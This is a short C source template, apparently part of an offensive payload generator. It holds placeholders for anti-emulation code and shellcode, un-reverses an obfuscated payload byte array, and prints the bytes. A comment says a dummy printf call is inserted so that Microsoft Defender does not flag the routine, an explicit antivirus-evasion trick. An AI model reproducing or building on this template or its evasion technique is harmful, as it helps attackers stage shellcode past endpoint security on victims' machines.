#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


int main(void) {
	{{ANTI_EMULATION}}

	{{SHELLCODE}}

	char shellcode[sizeof(reversed_payload)] = { 0 };

	// reverse our array of ints
	for (int i = 0; i < sizeof(reversed_payload); i++)
	{
		printf(""); // defender fires an alert on this routine without this ¯\_(ツ)_/¯
		shellcode[i] = reversed_payload[sizeof(reversed_payload) - i - 1];
	}

	int idx = 0;
	while ( idx < sizeof(reversed_payload))
	{
		if (idx == (sizeof(reversed_payload) - 1) )
		{
			printf("0x%02x ", (unsigned char)shellcode[idx]);
		}
		else
		{
			printf("0x%02x, ", (unsigned char)shellcode[idx]);
		}
		idx++;
	}


    return 0;
}

